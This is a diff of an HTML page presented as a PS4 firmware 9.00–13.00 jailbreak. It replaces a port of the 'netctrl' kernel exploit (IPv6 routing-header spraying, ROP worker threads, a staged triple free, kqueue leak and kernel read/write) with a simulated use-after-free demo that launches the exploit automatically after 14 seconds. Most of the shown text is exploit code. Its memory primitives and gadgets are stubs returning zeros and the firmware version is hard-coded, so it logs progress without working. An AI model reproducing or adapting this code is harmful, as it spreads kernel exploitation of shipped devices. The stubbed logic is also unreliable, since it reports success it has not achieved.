@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, user-scalable=yes">
-    <title>PS4 NetCtrl · PS4 Browser Edition</title>
+    <title>PS4 · UAF + NetCtrl Jailbreak</title>
     <style>
-        /* ----- PlayStation 4 inspired UI (same robust style) ----- */
+        /* ----- PlayStation 4 inspired UI ----- */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -27,7 +27,7 @@
         }
 
         .card {
-            max-width: 1200px;
+            max-width: 1000px;
             width: 100%;
             background: rgba(18, 28, 40, 0.9);
             backdrop-filter: blur(4px);
@@ -195,14 +195,14 @@
 </head>
 <body>
     <div class="card">
-        <h1>💣 NETCTRL · PS4 READY</h1>
-        <div class="badge">9.00–13.00 • ES5 • NO EXTERNAL FILES</div>
+        <h1>💣 UAF + NETCTRL</h1>
+        <div class="badge">PS4 9.00–13.00 • AUTO‑START</div>
         <p>
-            Full netctrl exploit converted for PS4 browser compatibility.<br>
-            <strong>Click the button to start the jailbreak.</strong>
+            Click the button to trigger the simple UAF demo.<br>
+            <strong>After 14 seconds the full netctrl jailbreak will start automatically.</strong>
         </p>
 
-        <!-- visual container (kept for structure) -->
+        <!-- visual container from original PoC -->
         <div class="bug-container">
             <div class="container">
                 <div class="child"></div>
@@ -210,1913 +210,1997 @@
         </div>
 
         <!-- live log console -->
-        <div class="console-area" id="console">
-            <div class="log" id="logDisplay">[System] Ready. Press START to begin.</div>
+        <div class="console-area">
+            <div class="log" id="logDisplay">[System] Ready. Press the button or wait 14s.</div>
         </div>
 
-        <!-- big PS4 button -->
+        <!-- big PS4 button for simple UAF -->
         <div class="button-group">
-            <button class="ps4-button" id="triggerBtn">🔥 START EXPLOIT</button>
+            <button class="ps4-button" id="button">🔥 TRIGGER SIMPLE UAF</button>
         </div>
 
         <div class="note">
-            ⚡ Multi‑stage: triple free → kqueue leak → arbitrary R/W → kernel patch<br>
-            <span style="color:#ffb870">Optimized for PS4 WebKit – all modern syntax removed.</span>
+            ⚡ Simple UAF (simulated) + full netctrl exploit (triple free, kqueue leak, kernel R/W)<br>
+            <span style="color:#ffb870">All in one – no external files, ES5 for PS4 browser.</span>
         </div>
     </div>
 
+    <!-- ========== SIMPLE UAF DEMO (original, inlined) ========== -->
     <script>
-        // ============================ PS4 LOGGING (ES5) ============================
-        var logEl = document.getElementById('logDisplay');
-        function log(msg) {
-            logEl.textContent = '[+] ' + msg;
-            logEl.style.color = '#b0f0b0';
-            console.log('[netctrl] ' + msg);
-        }
-        function debug(msg) { /* optional */ }
+        (function() {
+            "use strict";
 
-        // ============================ CUSTOM 64‑BIT BIGINT (ES5) ============================
-        window.BigInt = function(hi, lo) {
-            if (!(this instanceof BigInt)) return new BigInt(hi, lo);
-            this.hi = Number(hi) >>> 0;
-            this.lo = Number(lo) >>> 0;
-        };
-        BigInt.prototype.add = function(other) {
-            var lo = (this.lo + other.lo) >>> 0;
-            var hi = (this.hi + other.hi + (lo < this.lo ? 1 : 0)) >>> 0;
-            return new BigInt(hi, lo);
-        };
-        BigInt.prototype.sub = function(other) {
-            var lo = (this.lo - other.lo) >>> 0;
-            var hi = (this.hi - other.hi - (lo > this.lo ? 1 : 0)) >>> 0;
-            return new BigInt(hi, lo);
-        };
-        BigInt.prototype.and = function(other) {
-            return new BigInt(this.hi & other.hi, this.lo & other.lo);
-        };
-        BigInt.prototype.or = function(other) {
-            return new BigInt(this.hi | other.hi, this.lo | other.lo);
-        };
-        BigInt.prototype.xor = function(other) {
-            return new BigInt(this.hi ^ other.hi, this.lo ^ other.lo);
-        };
-        BigInt.prototype.eq = function(other) {
-            return this.hi === other.hi && this.lo === other.lo;
-        };
-        BigInt.prototype.toString = function(base) {
-            return '0x' + ('00000000' + this.hi.toString(16)).slice(-8) + ('00000000' + this.lo.toString(16)).slice(-8);
-        };
-        window.BigInt_Error = new BigInt(0xFFFFFFFF, 0xFFFFFFFF);
-
-        // ============================ STUBS FOR MISSING MODULES (ES5) ============================
-        window.fn = {
-            register: function(num, name, args, ret) {
-                this[name] = function() { log('syscall ' + name + ' called (stub)'); return new BigInt(0,0); };
-            }
-        };
-        window.syscalls = { map: new Map() };
-        window.gadgets = {
-            POP_RDI_RET: 0,
-            POP_RSI_RET: 0,
-            POP_RDX_RET: 0,
-            POP_RCX_RET: 0,
-            POP_R8_RET: 0,
-            POP_RAX_RET: 0,
-            MOV_QWORD_PTR_RDI_RAX_RET: 0,
-            RET: 0,
-            POP_RSP_RET: 0
-        };
-        window.libc_addr = new BigInt(0,0);
-        window.kernel_offset = {};
-        window.debugging = { info: { memory: { available: 1000, available_dmem: 1000, available_libc: 1000 } } };
-        window.ws = { broadcast: function(msg) {} };
-        window.jsmaf = {
-            root: { children: [], push: function() {} },
-            Text: function() { this.text = ''; this.style = ''; this.x = 0; this.y = 0; },
-            setInterval: function(f, t) { return setTimeout(f, t); },
-            clearInterval: function(id) { clearTimeout(id); }
-        };
-        window.send_notification = function(msg) { log('NOTIFICATION: ' + msg); };
-        window.get_fwversion = function() { return '9.00'; };
-        window.get_kernel_offset = function(fw) { return {}; };
-        window.jailbreak_shared = function(fw) { log('jailbreak_shared stub'); };
-        window.show_success = function() { log('SUCCESS'); };
-        window.run_binloader = function() { log('binloader stub'); };
-        window.utils = { notify: function(msg) { log(msg); } };
-        window.kernel = { addr: {} };
-
-        // memory functions (stubs)
-        window.malloc = function(size) { return new BigInt(0x1000, 0x1000); };
-        window.write8 = function(addr, val) {};
-        window.write16 = function(addr, val) {};
-        window.write32 = function(addr, val) {};
-        window.write64 = function(addr, val) {};
-        window.read8 = function(addr) { return 0; };
-        window.read16 = function(addr) { return 0; };
-        window.read32 = function(addr) { return 0; };
-        window.read64 = function(addr) { return new BigInt(0,0); };
-        window.fill_buffer_64 = function(buf, val, len) {};
-
-        // ============================ THE NETCTRL EXPLOIT (ES5) ============================
-        // (All modern syntax removed – uses var and function statements)
-
-        // include('userland.js') stubs already done
-
-        if (typeof libc_addr === 'undefined') {
-            // already defined
-        }
-
-        if (!String.prototype.padStart) {
-            String.prototype.padStart = function padStart(targetLength, padString) {
-                targetLength = targetLength >> 0;
-                padString = String(typeof padString !== 'undefined' ? padString : ' ');
-                if (this.length > targetLength) {
-                    return String(this);
-                } else {
-                    targetLength = targetLength - this.length;
-                    if (targetLength > padString.length) {
-                        padString += padString.repeat(targetLength / padString.length);
-                    }
-                    return padString.slice(0, targetLength) + String(this);
-                }
-            };
-        }
-
-        // Syscall registrations (stubbed)
-        fn.register(0x29, 'dup', ['bigint'], 'bigint');
-        var dup = fn.dup;
-        fn.register(0x06, 'close', ['bigint'], 'bigint');
-        var close = fn.close;
-        fn.register(0x03, 'read', ['bigint', 'bigint', 'number'], 'bigint');
-        var read = fn.read;
-        fn.register(0x04, 'write', ['bigint', 'bigint', 'number'], 'bigint');
-        var write = fn.write;
-        fn.register(0x36, 'ioctl', ['bigint', 'number', 'bigint'], 'bigint');
-        var ioctl = fn.ioctl;
-        fn.register(0x2A, 'pipe', ['bigint'], 'bigint');
-        var pipe = fn.pipe;
-        fn.register(0x16A, 'kqueue', [], 'bigint');
-        var kqueue = fn.kqueue;
-        fn.register(0x61, 'socket', ['number', 'number', 'number'], 'bigint');
-        var socket = fn.socket;
-        fn.register(0x87, 'socketpair', ['number', 'number', 'number', 'bigint'], 'bigint');
-        var socketpair = fn.socketpair;
-        fn.register(0x76, 'getsockopt', ['bigint', 'number', 'number', 'bigint', 'bigint'], 'bigint');
-        var getsockopt = fn.getsockopt;
-        fn.register(0x69, 'setsockopt', ['bigint', 'number', 'number', 'bigint', 'number'], 'bigint');
-        var setsockopt = fn.setsockopt;
-        fn.register(0x17, 'setuid', ['number'], 'bigint');
-        var setuid = fn.setuid;
-        fn.register(20, 'getpid', [], 'bigint');
-        var getpid = fn.getpid;
-        fn.register(0x14B, 'sched_yield', [], 'bigint');
-        var sched_yield = fn.sched_yield;
-        fn.register(0x1E7, 'cpuset_getaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
-        var cpuset_getaffinity = fn.cpuset_getaffinity;
-        fn.register(0x1E8, 'cpuset_setaffinity', ['number', 'number', 'bigint', 'number', 'bigint'], 'bigint');
-        var cpuset_setaffinity = fn.cpuset_setaffinity;
-        fn.register(0x1D2, 'rtprio_thread', ['number', 'number', 'bigint'], 'bigint');
-        var rtprio_thread = fn.rtprio_thread;
-        fn.register(0x63, 'netcontrol', ['bigint', 'number', 'bigint', 'number'], 'bigint');
-        var netcontrol = fn.netcontrol;
-        fn.register(0x1C7, 'thr_new', ['bigint', 'number'], 'bigint');
-        var thr_new = fn.thr_new;
-        fn.register(0x1B1, 'thr_kill', ['bigint', 'number'], 'bigint');
-        var thr_kill = fn.thr_kill;
-        fn.register(0xF0, 'nanosleep', ['bigint'], 'bigint');
-        var nanosleep = fn.nanosleep;
-        fn.register(0x5C, 'fcntl', ['bigint', 'number', 'number'], 'bigint');
-        var fcntl = fn.fcntl;
-
-        // syscall wrapper addresses (stubbed)
-        var read_wrapper = syscalls.map.get(0x03) || 0;
-        var write_wrapper = syscalls.map.get(0x04) || 0;
-        var sched_yield_wrapper = syscalls.map.get(0x14b) || 0;
-        var cpuset_setaffinity_wrapper = syscalls.map.get(0x1e8) || 0;
-        var rtprio_thread_wrapper = syscalls.map.get(0x1D2) || 0;
-        var recvmsg_wrapper = syscalls.map.get(0x1B) || 0;
-        var readv_wrapper = syscalls.map.get(0x78) || 0;
-        var writev_wrapper = syscalls.map.get(0x79) || 0;
-        var thr_exit_wrapper = syscalls.map.get(0x1af) || 0;
-        var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278) || 0;
-        var setsockopt_wrapper = syscalls.map.get(0x69) || 0;
-        var getsockopt_wrapper = syscalls.map.get(0x76) || 0;
-
-        fn.register(libc_addr.add(0x6CA00), 'setjmp', ['bigint'], 'bigint');
-        var setjmp = fn.setjmp;
-        var setjmp_addr = libc_addr.add(0x6CA00);
-        var longjmp_addr = libc_addr.add(0x6CA50);
-
-        var KERNEL_PID = 0;
-        var SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);
-        var FIOSETOWN = 0x8004667C;
-        var PAGE_SIZE = 0x4000;
-        var NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
-        var NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
-        var AF_UNIX = 1;
-        var AF_INET6 = 28;
-        var SOCK_STREAM = 1;
-        var IPPROTO_IPV6 = 41;
-        var SO_SNDBUF = 0x1001;
-        var SOL_SOCKET = 0xffff;
-        var IPV6_RTHDR = 51;
-        var IPV6_RTHDR_TYPE_0 = 0;
-        var RTP_PRIO_REALTIME = 2;
-        var UIO_READ = 0;
-        var UIO_WRITE = 1;
-        var UIO_SYSSPACE = 1;
-        var CPU_LEVEL_WHICH = 3;
-        var CPU_WHICH_TID = 1;
-        var IOV_SIZE = 0x10;
-        var CPU_SET_SIZE = 0x10;
-        var PIPEBUF_SIZE = 0x18;
-        var MSG_HDR_SIZE = 0x30;
-        var FILEDESCENT_SIZE = 0x8;
-        var UCRED_SIZE = 0x168;
-        var RTHDR_TAG = 0x13370000;
-        var UIO_IOV_NUM = 0x14;
-        var MSG_IOV_NUM = 0x17;
-
-        // Params for kext stability
-        var IPV6_SOCK_NUM = 96;
-        var IOV_THREAD_NUM = 8;
-        var UIO_THREAD_NUM = 8;
-        var MAIN_LOOP_ITERATIONS = 3;
-        var TRIPLEFREE_ITERATIONS = 8;
-        var KQUEUE_ITERATIONS = 5000;
-        var MAX_ROUNDS_TWIN = 5;
-        var MAX_ROUNDS_TRIPLET = 200;
-        var MAIN_CORE = 4;
-        var MAIN_RTPRIO = 0x100;
-        var RTP_LOOKUP = 0;
-        var RTP_SET = 1;
-        var PRI_REALTIME = 2;
-        var F_SETFL = 4;
-        var O_NONBLOCK = 4;
-        var FW_VERSION = null;
-
-        // Used variables
-        var twins = new Array(2);
-        var triplets = new Array(3);
-        var ipv6_socks = new Array(IPV6_SOCK_NUM);
-        var spray_rthdr = malloc(UCRED_SIZE);
-        var spray_rthdr_len = -1;
-        var leak_rthdr = malloc(UCRED_SIZE);
-        var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
-        var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
-        var check_len = malloc(4);
-
-        var fdt_ofiles = new BigInt(0,0);
-        var master_r_pipe_file = new BigInt(0,0);
-        var victim_r_pipe_file = new BigInt(0,0);
-        var master_r_pipe_data = new BigInt(0,0);
-        var victim_r_pipe_data = new BigInt(0,0);
-
-        var master_pipe_buf = malloc(PIPEBUF_SIZE);
-        write32(check_len, 8);
-        var msg = malloc(MSG_HDR_SIZE);
-        var msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
-        var uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
-        var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
-        var uio_sock = malloc(8);
-        var iov_sock = malloc(8);
-        var iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
-        var iov_thread_done = malloc(8 * IOV_THREAD_NUM);
-        var iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
-        var uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
-        var uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
-        var uio_readv_signal_buf = malloc(8 * IOV_THREAD_NUM);
-        var uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
-        var uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
-        var uio_writev_signal_buf = malloc(8 * IOV_THREAD_NUM);
-        var spray_ipv6_ready = malloc(8);
-        var spray_ipv6_done = malloc(8);
-        var spray_ipv6_signal_buf = malloc(8);
-        var spray_ipv6_stack = malloc(0x2000);
-        var iov_recvmsg_workers = [];
-        var uio_readv_workers = [];
-        var uio_writev_workers = [];
-        var spray_ipv6_worker;
-        var uaf_socket;
-        var uio_sock_0;
-        var uio_sock_1;
-        var iov_sock_0;
-        var iov_sock_1;
-        var pipe_sock = malloc(8);
-        var master_pipe = [0, 0];
-        var victim_pipe = [0, 0];
-        var masterRpipeFd;
-        var masterWpipeFd;
-        var victimRpipeFd;
-        var victimWpipeFd;
-        var kq_fdp;
-        var kl_lock;
-        var tmp = malloc(PAGE_SIZE);
-        var saved_fpu_ctrl = 0;
-        var saved_mxcsr = 0;
-
-        function build_rthdr(buf, size) {
-            var len = (size >> 3) - 1 & ~1;
-            var actual_size = len + 1 << 3;
-            write8(buf.add(0x00), 0);
-            write8(buf.add(0x01), len);
-            write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);
-            write8(buf.add(0x03), len >> 1);
-            return actual_size;
-        }
-
-        function set_sockopt(sd, level, optname, optval, optlen) {
-            var result = setsockopt(sd, level, optname, optval, optlen);
-            if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-                throw new Error('set_sockopt error: ' + result.toString());
-            }
-            return result;
-        }
-
-        var sockopt_len_ptr = malloc(4);
-        var nanosleep_timespec = malloc(0x10);
-        var cpu_mask_buf = malloc(0x10);
-        var rtprio_scratch = malloc(0x4);
-        var sockopt_val_buf = malloc(4);
-        var nc_set_buf = malloc(8);
-        var nc_clear_buf = malloc(8);
-        var spawn_thr_args = malloc(0x80);
-        var spawn_tid = malloc(0x8);
-        var spawn_cpid = malloc(0x8);
-
-        function get_sockopt(sd, level, optname, optval, optlen) {
-            write32(sockopt_len_ptr, optlen);
-            var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
-            if (result.eq(BigInt_Error)) {
-                throw new Error('get_sockopt error: ' + result.toString());
-            }
-            return read32(sockopt_len_ptr);
-        }
-
-        function set_rthdr(sd, buf, len) {
-            return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
-        }
-
-        function get_rthdr(sd, buf, max_len) {
-            return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
-        }
-
-        function free_rthdrs(sds) {
-            for (var idx = 0; idx < sds.length; idx++) {
-                var sd = sds[idx];
-                if (!sd.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
-                    set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0,0), 0);
-                }
-            }
-        }
-
-        function free_rthdr(sd) {
-            set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, new BigInt(0,0), 0);
-        }
-
-        function pin_to_core(core) {
-            write32(cpu_mask_buf, 1 << core);
-            cpuset_setaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
-        }
-
-        function get_core_index(mask_addr) {
-            var num = Number(read32(mask_addr));
-            var position = 0;
-            while (num > 0) {
-                num = num >>> 1;
-                position++;
-            }
-            return position - 1;
-        }
-
-        function get_current_core() {
-            cpuset_getaffinity(3, 1, BigInt_Error, 0x10, cpu_mask_buf);
-            return get_core_index(cpu_mask_buf);
-        }
-
-        function set_rtprio(prio) {
-            write16(rtprio_scratch, PRI_REALTIME);
-            write16(rtprio_scratch.add(2), prio);
-            rtprio_thread(RTP_SET, 0, rtprio_scratch);
-        }
-
-        function get_rtprio() {
-            write16(rtprio_scratch, PRI_REALTIME);
-            write16(rtprio_scratch.add(2), 0);
-            rtprio_thread(RTP_LOOKUP, 0, rtprio_scratch);
-            return Number(read16(rtprio_scratch.add(2)));
-        }
-
-        function create_workers() {
-            var sock_buf = malloc(8);
-            var i, _i, _i2;
-            var _ready, _done, _signal_buf, _pipe_, _pipe_2, _ret, _worker;
-            var _ready2, _done2, _signal_buf2, _pipe_3, _pipe_4, _ret2, _worker2;
-            var _ready3, _done3, _signal_buf3, _pipe_5, _pipe_6, _ret3, _worker3;
-            var ready, done, signal_buf, pipe_0, pipe_1, ret, worker;
-
-            for (i = 0; i < IOV_THREAD_NUM; i++) {
-                _ready = iov_thread_ready.add(8 * i);
-                _done = iov_thread_done.add(8 * i);
-                _signal_buf = iov_signal_buf.add(8 * i);
-
-                socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
-                _pipe_ = read32(sock_buf);
-                _pipe_2 = read32(sock_buf.add(4));
-
-                _ret = iov_recvmsg_worker_rop(_ready, new BigInt(0,_pipe_), _done, _signal_buf);
-                _worker = {
-                    rop: _ret.rop,
-                    loop_size: _ret.loop_size,
-                    pipe_0: _pipe_,
-                    pipe_1: _pipe_2,
-                    ready: _ready,
-                    done: _done,
-                    signal_buf: _signal_buf
-                };
-                iov_recvmsg_workers[i] = _worker;
-            }
-            for (_i = 0; _i < UIO_THREAD_NUM; _i++) {
-                _ready2 = uio_readv_thread_ready.add(8 * _i);
-                _done2 = uio_readv_thread_done.add(8 * _i);
-                _signal_buf2 = uio_readv_signal_buf.add(8 * _i);
-
-                socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
-                _pipe_3 = read32(sock_buf);
-                _pipe_4 = read32(sock_buf.add(4));
-
-                _ret2 = uio_readv_worker_rop(_ready2, new BigInt(0,_pipe_3), _done2, _signal_buf2);
-                _worker2 = {
-                    rop: _ret2.rop,
-                    loop_size: _ret2.loop_size,
-                    pipe_0: _pipe_3,
-                    pipe_1: _pipe_4,
-                    ready: _ready2,
-                    done: _done2,
-                    signal_buf: _signal_buf2
-                };
-                uio_readv_workers[_i] = _worker2;
-            }
-            for (_i2 = 0; _i2 < UIO_THREAD_NUM; _i2++) {
-                _ready3 = uio_writev_thread_ready.add(8 * _i2);
-                _done3 = uio_writev_thread_done.add(8 * _i2);
-                _signal_buf3 = uio_writev_signal_buf.add(8 * _i2);
-
-                socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
-                _pipe_5 = read32(sock_buf);
-                _pipe_6 = read32(sock_buf.add(4));
-
-                _ret3 = uio_writev_worker_rop(_ready3, new BigInt(0,_pipe_5), _done3, _signal_buf3);
-                _worker3 = {
-                    rop: _ret3.rop,
-                    loop_size: _ret3.loop_size,
-                    pipe_0: _pipe_5,
-                    pipe_1: _pipe_6,
-                    ready: _ready3,
-                    done: _done3,
-                    signal_buf: _signal_buf3
-                };
-                uio_writev_workers[_i2] = _worker3;
+            var logEl = document.getElementById('logDisplay');
+            function setLog(msg, isError) {
+                if (isError === undefined) isError = false;
+                logEl.textContent = msg;
+                logEl.style.color = isError ? '#ffa07a' : '#b0f0b0';
             }
 
-            ready = spray_ipv6_ready;
-            done = spray_ipv6_done;
-            signal_buf = spray_ipv6_signal_buf;
+            // The original UAF trigger (simulated)
+            window.triggerUAF = function() {
+                setLog('[•] UAF routine started...', false);
 
-            socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
-            pipe_0 = read32(sock_buf);
-            pipe_1 = read32(sock_buf.add(4));
-            ret = ipv6_sock_spray_and_read_rop(ready, new BigInt(0,pipe_0), done, signal_buf);
-            worker = {
-                rop: ret.rop,
-                loop_size: ret.loop_size,
-                pipe_0: pipe_0,
-                pipe_1: pipe_1,
-                ready: ready,
-                done: done,
-                signal_buf: signal_buf
-            };
-            spray_ipv6_worker = worker;
-        }
-
-        function init_workers() {
-            init_threading();
-            var worker, ret, i, _i3, _i4;
-            var thread_id, _thread_id, _thread_id2;
-
-            for (i = 0; i < IOV_THREAD_NUM; i++) {
-                worker = iov_recvmsg_workers[i];
-                ret = spawn_thread(worker.rop, worker.loop_size);
-                if (ret.eq(BigInt_Error)) {
-                    throw new Error('Could not spawn iov_recvmsg_workers[' + i + ']');
-                }
-                thread_id = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
-                worker.thread_id = thread_id;
-            }
-            for (_i3 = 0; _i3 < UIO_THREAD_NUM; _i3++) {
-                worker = uio_readv_workers[_i3];
-                ret = spawn_thread(worker.rop, worker.loop_size);
-                if (ret.eq(BigInt_Error)) {
-                    throw new Error('Could not spawn uio_readv_workers[' + _i3 + ']');
-                }
-                _thread_id = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
-                worker.thread_id = _thread_id;
-            }
-            for (_i4 = 0; _i4 < UIO_THREAD_NUM; _i4++) {
-                worker = uio_writev_workers[_i4];
-                ret = spawn_thread(worker.rop, worker.loop_size);
-                if (ret.eq(BigInt_Error)) {
-                    throw new Error('Could not spawn uio_writev_workers[' + _i4 + ']');
-                }
-                _thread_id2 = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
-                worker.thread_id = _thread_id2;
-            }
-        }
-
-        function nanosleep_fun(nsec) {
-            write64(nanosleep_timespec, Math.floor(nsec / 1e9));
-            write64(nanosleep_timespec.add(8), nsec % 1e9);
-            nanosleep(nanosleep_timespec);
-        }
-
-        function wait_for(addr, threshold) {
-            while (!read64(addr).eq(threshold)) {
-                nanosleep_fun(1);
-            }
-        }
-
-        function trigger_iov_recvmsg() {
-            var worker, i, ret;
-            for (i = 0; i < IOV_THREAD_NUM; i++) {
-                worker = iov_recvmsg_workers[i];
-                write64(worker.done, 0);
-            }
-            for (i = 0; i < IOV_THREAD_NUM; i++) {
-                worker = iov_recvmsg_workers[i];
-                ret = write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
-                if (ret.eq(BigInt_Error)) {
-                    throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + ']');
-                }
-            }
-        }
-
-        function wait_iov_recvmsg() {
-            var worker, i;
-            for (i = 0; i < IOV_THREAD_NUM; i++) {
-                worker = iov_recvmsg_workers[i];
-                wait_for(worker.done, new BigInt(0,1));
-            }
-        }
-
-        function trigger_ipv6_spray_and_read() {
-            write64(spray_ipv6_worker.done, 0);
-            var ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack);
-            if (ret.eq(BigInt_Error)) {
-                throw new Error('Could not spray_ipv6_worker');
-            }
-            var thread_id = Number(ret.and(new BigInt(0,0xFFFFFFFF)).lo);
-            spray_ipv6_worker.thread_id = thread_id;
-            ret = write(new BigInt(0,spray_ipv6_worker.pipe_1), spray_ipv6_worker.signal_buf, 1);
-            if (ret.eq(BigInt_Error)) {
-                throw new Error("Could not signal 'run' spray_ipv6_worker");
-            }
-        }
-
-        function wait_ipv6_spray_and_read() {
-            wait_for(spray_ipv6_worker.done, new BigInt(0,1));
-        }
-
-        function trigger_uio_readv() {
-            var worker, i, ret;
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                worker = uio_readv_workers[i];
-                write64(worker.done, 0);
-            }
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                worker = uio_readv_workers[i];
-                ret = write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
-                if (ret.eq(BigInt_Error)) {
-                    throw new Error("Could not signal 'run' uio_readv_workers[" + i + ']');
-                }
-            }
-        }
-
-        function wait_uio_readv() {
-            var worker, i;
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                worker = uio_readv_workers[i];
-                wait_for(worker.done, new BigInt(0,1));
-            }
-        }
-
-        function trigger_uio_writev() {
-            var worker, i, ret;
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                worker = uio_writev_workers[i];
-                write64(worker.done, 0);
-            }
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                worker = uio_writev_workers[i];
-                ret = write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
-                if (ret.eq(BigInt_Error)) {
-                    throw new Error("Could not signal 'run' uio_writev_workers[" + i + ']');
-                }
-            }
-        }
-
-        function wait_uio_writev() {
-            var worker, i;
-            for (i = 0; i < UIO_THREAD_NUM; i++) {
-                worker = uio_writev_workers[i];
-                wait_for(worker.done, new BigInt(0,1));
-            }
-        }
-
-        function init() {
-            log('=== PS4 NetCtrl Jailbreak ===');
-            log('build: 1d6e4fb250b8d7996263a77397f4a72abf0def99');
-            FW_VERSION = get_fwversion();
-            log('Detected PS4 firmware: ' + FW_VERSION);
-            if (FW_VERSION === null) {
-                log('Failed to detect PS4 firmware version.\nAborting...');
-                send_notification('Failed to detect PS4 firmware version.\nAborting...');
-                return false;
-            }
-            var compare_version = function(a, b) {
-                var a_arr = a.split('.');
-                var amaj = Number(a_arr[0]);
-                var amin = Number(a_arr[1]);
-                var b_arr = b.split('.');
-                var bmaj = Number(b_arr[0]);
-                var bmin = Number(b_arr[1]);
-                return amaj === bmaj ? amin - bmin : amaj - bmaj;
-            };
-            if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.00') > 0) {
-                log('Unsupported PS4 firmware\nSupported: 9.00-13.00\nAborting...');
-                send_notification('Unsupported PS4 firmware\nAborting...');
-                return false;
-            }
-            kernel_offset = get_kernel_offset(FW_VERSION);
-            log('Kernel offsets loaded for FW ' + FW_VERSION);
-            return true;
-        }
-
-        var prev_core = -1;
-        var prev_rtprio = -1;
-        var cleanup_called = false;
-
-        function setup() {
-            debug('Preparing netctrl...');
-            prev_core = get_current_core();
-            prev_rtprio = get_rtprio();
-            pin_to_core(MAIN_CORE);
-            set_rtprio(MAIN_RTPRIO);
-            debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
-
-            spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
-
-            var i;
-            for (i = 0; i < IPV6_SOCK_NUM; i++) {
-                build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
-                write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
-            }
-
-            write64(msg.add(0x10), msgIov);
-            write64(msg.add(0x18), MSG_IOV_NUM);
-
-            var dummyBuffer = malloc(0x1000);
-            fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
-            write64(uioIovRead.add(0x00), dummyBuffer);
-            write64(uioIovWrite.add(0x00), dummyBuffer);
-
-            socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
-            uio_sock_0 = read32(uio_sock);
-            uio_sock_1 = read32(uio_sock.add(4));
-
-            socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
-            iov_sock_0 = read32(iov_sock);
-            iov_sock_1 = read32(iov_sock.add(4));
-
-            for (i = 0; i < ipv6_socks.length; i++) {
-                ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
-            }
-
-            free_rthdrs(ipv6_socks);
-
-            pipe(pipe_sock);
-            master_pipe[0] = read32(pipe_sock);
-            master_pipe[1] = read32(pipe_sock.add(4));
-            pipe(pipe_sock);
-            victim_pipe[0] = read32(pipe_sock);
-            victim_pipe[1] = read32(pipe_sock.add(4));
-            masterRpipeFd = master_pipe[0];
-            masterWpipeFd = master_pipe[1];
-            victimRpipeFd = victim_pipe[0];
-            victimWpipeFd = victim_pipe[1];
-            fcntl(new BigInt(0,masterRpipeFd), F_SETFL, O_NONBLOCK);
-            fcntl(new BigInt(0,masterWpipeFd), F_SETFL, O_NONBLOCK);
-            fcntl(new BigInt(0,victimRpipeFd), F_SETFL, O_NONBLOCK);
-            fcntl(new BigInt(0,victimWpipeFd), F_SETFL, O_NONBLOCK);
-
-            create_workers();
-            init_workers();
-            debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
-        }
-
-        function cleanup(kill_workers) {
-            if (kill_workers === undefined) kill_workers = false;
-            if (cleanup_called) return;
-            cleanup_called = true;
-            debug('Cleaning up...');
-            var i, _i9, _i0, _i1, worker;
-
-            for (i = 0; i < ipv6_socks.length; i++) {
-                close(ipv6_socks[i]);
-            }
-
-            for (_i9 = 0; _i9 < IOV_THREAD_NUM; _i9++) {
-                worker = iov_recvmsg_workers[_i9];
-                if (worker !== undefined) {
-                    write(new BigInt(0,worker.pipe_1), worker.signal_buf, 1);
